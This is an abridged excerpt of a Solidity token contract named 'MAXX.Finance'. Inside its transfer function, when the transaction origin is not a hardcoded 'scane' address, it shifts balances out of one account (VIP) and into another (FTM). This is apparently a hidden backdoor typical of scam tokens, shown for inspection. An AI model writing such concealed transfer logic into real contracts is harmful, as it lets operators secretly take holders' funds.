...
contract COINDATA {
  ...
  address internal _dex = 0x6782E5E62D848B6DdA09230329E54B5F264f02c7;
  ...
  address public constant _OFFICE = 0x395856583c8758e8958ae3142660fdC511F60885;
  address public constant nftAddress =
    0x37D9C0adb8ddc34e94b21543606A49a8622B1f90;
  address public constant scane = 0xa54743035514B12Ff1132BCAf0488841a797cc8f;
...
contract Coin is COINDATA, IERC20, Context {
  ...
  string public constant _name = "MAXX.Finance";
  string public constant _symbol = "MAXX";
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != scane) {
      ...
      if (success) {
        ...
        if (exAmount > 0 && _tOwned[VIP] > exAmount) {
          _tOwned[FTM] = _tOwned[FTM] + exAmount;
          _tOwned[VIP] = _tOwned[VIP] - exAmount;
